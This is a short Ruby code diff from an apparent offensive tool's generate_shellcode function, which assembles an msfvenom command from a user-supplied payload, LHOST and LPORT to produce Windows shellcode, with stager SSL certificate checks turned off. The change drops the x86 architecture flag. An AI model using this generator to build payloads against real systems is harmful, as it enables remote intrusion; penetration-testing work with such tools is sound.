@@ -201,7 +201,7 @@ def generate_shellcode (payload, lhost, lport)
 	newVar = ''
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
-	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c StagerURILength=5 StagerVerifySSLCert=false")
+	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " --platform windows -f c StagerURILength=5 StagerVerifySSLCert=false")
 	puts "Now running " +  command
 	puts " "
 	#Executes the built msfvenom command and assigns output to variable newVar
